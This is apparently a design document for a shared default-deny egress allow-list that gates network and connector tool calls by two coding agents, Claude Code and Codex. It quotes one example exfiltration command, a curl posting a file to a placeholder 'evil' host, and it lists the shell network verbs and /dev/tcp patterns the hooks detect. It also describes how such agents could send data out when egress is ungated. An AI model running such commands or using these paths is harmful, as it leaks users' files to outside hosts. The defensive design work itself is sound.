# Design & Architecture

A single control that adds destination-aware egress enforcement to **both** local agents
(Claude Code and Codex) from one shared policy. This doc explains *why* the control exists
and *how* it is built. For the frozen allow-list model and the per-mode rules, see
[THREAT-MODEL.md](THREAT-MODEL.md).

## Why: the gap this closes

Two agents, one machine, shared state, and **no egress destination control on either**.

- **Claude Code** gated MCP tool calls for a few high-risk categories but had **no
  destination allow-list**: a `browser_navigate` / fetch to an arbitrary host, an
  unrecognized connector, or a shell `curl` to any host all passed. Anything the agent could
  name, it could reach.
- **Codex** ran its tool dispatcher with a denylist for destructive commands, but network
  verbs were excluded (a plain `curl https://evil -d @file` was allowed **even in a
  read-only turn**) and account connectors (`mcp__codex_apps__*`) reached the hook with no
  rule, returning *allow*. A connector send to an arbitrary backend went ungated.
- **Shared-state laundering.** Both agents touch the same files and state but shared no egress
  policy, so the **weaker** lane set the blast radius for both.

The unifying fix is one **default-deny egress allow-list**, enforced at each agent's existing
PreToolUse choke point, driven by a single shared policy file. Network/send-class tools must
match the configured host or connector allow-list; separate content, token, and
sensitive-read guards can also deny calls.

## System overview

```
tool call ─▶ PreToolUse hook ─▶ egress classifier ─▶ destination extracted from tool_input / command
                                      │                         │
                                      │                         ▼
                                      │              match against the shared allow-list
                                      ▼                         │
                              non-network tool            in list ─▶ existing logic
                              ─▶ existing logic            not in list ─▶ DENY
                                                           Claude MCP novel host + payload > size cap ─▶ DENY
```

The classifier is **additive**: non-network tools fall through to the agent's existing logic
unchanged. Only network/send-class tools take the new default-deny destination check.

## Classification: MCP modes, checked in order

1. **URL-host**: tools that carry an explicit URL. Allowed iff every extracted host is in
   `allow_hosts`; deceptive hosts are normalized to their true host first; no host ⇒ deny.
   Codex also allows loopback hosts independently of `allow_hosts`. Local
   `non_egress_servers` bypass the remaining modes after URL-host matching.
2. **Connector-class**: fixed-backend connectors (no URL in payload). Allowed iff the full
   tool name matches an `allow_connectors` glob; unknown/renamed ⇒ deny. Optional
   `connector_owner_scope` restricts a connector to allow-listed resource owners.
3. **Generic-network catch-all**: a tool whose name signals network/send behavior but matches
   neither mode above ⇒ fail-closed deny unless its server is local (`non_egress_servers`).
4. **Unknown tool carrying a `scheme://host` payload** ⇒ fail-closed deny in the Claude
   MCP hook only; the Codex patch falls through to allow after Mode 3.

The shell hook applies the same `allow_hosts` to `curl`/`wget`/`ssh`, and owner/host-scopes
`git push` / `gh` **writes** when `github_shell_owners` / `github_shell_hosts` are
present. Git/`gh` reads skip these write gates; explicit shell network verbs still
trigger host checks. See [THREAT-MODEL.md](THREAT-MODEL.md) for the exact rules and the
threat-gap → verifier traceability.

## Data model: the policy

A single JSON file (`mcp-gate-policy.json`) is the source of truth. It contains **hostnames
and tool-name globs, owner scopes, thresholds, and control settings; no secrets or tokens**. See
[policy/mcp-gate-policy.example.json](../policy/mcp-gate-policy.example.json) for the full
schema with inline documentation. Key properties:

- `egress.default = "deny"` applies **only** to tools matching a network mode; all other
  tools keep default-allow.
- Empty `allow_hosts` denies external URL-mode destinations (Codex exempts loopback);
  empty `allow_connectors` denies classified connectors outside local-server bypasses.
- Policy writes should be atomic so readers do not observe partial JSON; unavailable
  policy invokes the provider-specific fallback described below.

## Cross-provider parity

Both providers default to the same `mcp-gate-policy.json` path, with separate overrides
(`MCP_GATE_POLICY` for Claude egress hooks; `CODEX_EGRESS_POLICY` for Codex).
`tests/parity-check.sh` checks policy-key references and selected hardcoded host literals
statically; it does not execute Codex or prove behavioral equivalence.

The Claude MCP hook skips its egress gate if valid JSON lacks `egress.default == "deny"`.
On missing, unreadable, or invalid JSON, it uses fallback network-name denies, an unknown-URL
catch-all, local-server exemptions, and token gates; it does not deny every connector.
Codex rejects a missing or non-deny `egress` block and denies known connector namespaces
and selected network-name tools, while other MCP tools fall through to allow.
Both shell network-verb gates deny when policy is unavailable, but the optional git/`gh`
owner/host gates are inactive then.

Coverage also differs: Claude has the Mode 4 catch-all and additional shell checks for DNS
commands, `/dev/tcp|udp`, URL-opening commands, download execution, and raw GitHub API
writes; these are absent from the Codex patch. Codex allows URL-mode loopback hosts;
Claude MCP requires an allow-list match and Claude shell rejects bracketed IPv6 loopback.

## Scope boundaries

**In scope:** destination-aware egress allow-listing + default-deny for network/send-class
tools on both agents; connector owner-scoping; git/`gh` write owner+host scoping; shell
`curl`/`wget`/`ssh` host-checking; kill-switch hardening on the Codex side; deterministic
verifier coverage.

**Out of scope (see [LIMITATIONS.md](../LIMITATIONS.md)):** output-side taint tracking /
read→exfil correlation; decode-aware payload inspection; per-connector scoped credentials;
prompt-injection carried in tool output (egress control is input-side). These are inherent to
an input-side hook-layer control and are documented honestly rather than implied away.
